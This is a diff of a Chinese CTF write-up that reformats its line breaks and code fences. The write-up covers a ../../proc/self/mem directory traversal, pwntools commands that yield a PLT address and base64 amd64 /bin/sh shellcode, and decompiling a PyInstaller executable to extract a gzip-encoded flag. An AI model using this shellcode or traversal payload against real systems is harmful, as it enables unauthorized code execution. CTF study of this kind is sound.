@@ -100,7 +100,8 @@ b'amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F'
 
 使用uncompyle6对pyc文件进行反编译
 
-在reindeer.py找到from astar import astar, getczekolada然后getczekolada()就返回flag
+在reindeer.py找到
+from astar import astar, getczekolada然后getczekolada()就返回flag
 
 + + + + + + + + + + +
 
@@ -114,21 +115,18 @@ b'amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F'
 
 欢迎找到春秋GAME投稿哦～
 
-联系vx:cium0309
+联系vx:
+cium0309
 
 欢迎加入 春秋GAME CTF交流2群
 
-Q群:703460426
+Q群:
+703460426
 
 
 ```
 # 目录穿越漏洞
 ../../../../../../../proc/self/mem
-```
-
-
-
-```
 # 使用pwntools获取plt
 # 推荐python版本3.8以上
 # python3.6复制于容器
@@ -143,34 +141,14 @@ Q群:703460426
     FORTIFY:  Enabled
 >>> elf.plt['write']
 4327552
-```
-
-
-
-```
 # 使用pwntools得到shellcode
 >>> from pwn import *
 >>> from base64 import *
 >>> context.arch='amd64'
 >>> b64encode(asm(shellcraft.sh()))
 b'amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F'
-```
-
-
-
-```
 python pyinstxtractor.py reindeer.exe
-```
-
-
-
-```
 uncompyle6 -o reindeer.py reindeer.pyc
-```
-
-
-
-```
 def getczekolada():
     data = b'x1fx8bx08x00xd6x03xa0cx02xffKxcbILxafxb60J4JLN2xd3xb5xb400xd65xb14x06xb2x8cRx92txd3x0cMx8crS,rx92xcdRx0ckx01xc7Y,xef*x00x00x00'
     return gzip.decompress(data).decode('utf8')
